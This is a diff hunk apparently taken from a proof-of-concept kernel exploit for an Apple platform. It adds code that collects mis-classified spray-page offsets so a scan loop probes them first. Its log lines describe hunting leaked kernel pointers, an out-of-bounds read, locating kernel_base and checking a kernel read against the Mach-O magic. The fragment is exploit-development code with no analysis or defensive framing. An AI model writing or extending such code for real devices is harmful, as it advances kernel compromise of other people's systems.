@@ -145,8 +145,14 @@ static void cs2_write_banner(void) {
                  nw++;
                  if (nw <= 6) cs2_log("WRONG off %s (calib spray-page confusion; hunt kptr in CS2 scan)",
                                       line.UTF8String ?: "?");
+                 /* LSWARM-TARGET: parse the offsets for first-probe use in
+                    the scan loop (cs2/poc.c consumes g_lsw_wrong_offs) */
+                 if (g_lsw_wrong_n < 16)
+                     g_lsw_wrong_offs[g_lsw_wrong_n++] = strtoull(line.UTF8String, NULL, 16);
              }
          }];
+        if (g_lsw_wrong_n > 0)
+            cs2_log("[LSWORD-ARM] LSWARM-TARGET: %d wrong windows armed for first-probe", g_lsw_wrong_n);
         cs2_log("boot-learn: lightsword_hot=%d lightsword_wrong=%d (WRONG=copy confusion of SOCK_DGRAM pages; FOREIGN/kptr still required)",
                 nh, nw);
         cs2_log("look-for: oob HIT kind=PARTIAL|WHOLESALE cls=KERNEL POINTER, pcb_start_offset, kernel_base, kread32==0xfeedfacf");
